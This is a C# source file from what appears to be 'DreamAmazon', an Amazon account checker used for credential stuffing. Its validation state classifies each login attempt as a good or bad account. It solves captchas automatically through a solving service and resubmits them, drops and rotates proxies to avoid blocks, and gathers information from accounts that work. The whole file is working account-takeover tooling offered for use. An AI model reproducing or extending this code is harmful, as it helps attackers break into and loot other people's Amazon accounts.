using System;
using System.Net;
using System.Text.RegularExpressions;

namespace DreamAmazon
{
    public class ValidationState : CheckState
    {
        private readonly TimeSpan _getMetadataTimeout = TimeSpan.FromMinutes(1);
        private readonly Regex _attributesRegex = new Regex(Globals.REGEX, RegexOptions.Multiline | RegexOptions.IgnoreCase);
        private string _response;

        public ValidationState(StateContext context) : base(context)
        {
        }

        public void Init(string response)
        {
            _response = response;
        }

        private int _captchaCounter;

        public override void Handle(NetHelper nHelper)
        {
            var account = Context.CheckParams.Account;
            var proxyManager = Context.ProxyManager;

            if (StateContext.IsBadLog(_response))
            {
                Context.FireOnCheckCompleted(Context, CheckResults.Bad, Context.CheckParams);
            }
            else if (StateContext.IsSecurityQuestion(_response))
            {
                nHelper.GET("http://amazon.com/homepage=true");
                Context.GatherInformation(nHelper, account);

                Context.FireOnCheckCompleted(Context, CheckResults.Good, Context.CheckParams);
            }
            else if (StateContext.IsCookiesDisabled(_response))
            {
                Context.SetRestartState();
                return;
            }
            else if (StateContext.IsCaptchaMsg(_response))
            {
                if (Properties.Settings.Default.Mode == 0 || Properties.Settings.Default.Mode == 1)
                {
                    string captchaUrl = "https://opfcaptcha-prod.s3.amazonaws.com" +
                                        _response.Split(new[] { "opfcaptcha-prod.s3.amazonaws.com" },
                                            StringSplitOptions.None)[1].Split('"')[0];
                    byte[] captchaBytes;

                    using (WebClient wc = new WebClient())
                        captchaBytes = wc.DownloadData(captchaUrl);

                    var captchaResult = Context.CaptchaService.DecodeCaptchaAsync(captchaBytes).Result;

                    if (captchaResult != null)
                    {
                        var metadataFinder = new MetadataFinder(account);
                        var metadata = metadataFinder.Find(_getMetadataTimeout);

                        var attributes = StateContext.ParseAccountAttributes(account, metadata);

                        foreach (Match m in _attributesRegex.Matches(_response))
                        {
                            attributes.Add(m.Groups[1].ToString(), m.Groups[2].ToString());
                        }

                        attributes.Add("guess", captchaResult.Text);

                        var response = nHelper.POST(Globals.POST_URL, attributes);
                        Init(response);

                        // limit captcha attemts
                        if (_captchaCounter >= 5)
                        {
                            Context.SetFinishState();
                            return;
                        }

                        _captchaCounter++;

                        return;
                    }
                    //todo: captcha not recognized, so need to request new one
                }
                else
                {
                    proxyManager.RemoveProxy(nHelper.Proxy);
                    Context.SetRestartState();
                    return;
                }
            }
            else if (StateContext.IsAskCredentials(_response))
            {
                Context.SetRestartState();
            }
            else if (StateContext.IsAnotherDevice(_response))
            {
                Context.FireOnCheckCompleted(Context, CheckResults.Good, Context.CheckParams);
            }
            else if (StateContext.IsError(_response))
            {
                proxyManager.RemoveProxy(nHelper.Proxy);
                Context.SetRestartState();
                return;
            }
            else
            {
                Context.GatherInformation(nHelper, account);

                Context.FireOnCheckCompleted(Context, CheckResults.Good, Context.CheckParams);
            }

            Context.SetFinishState();
        }
    }
}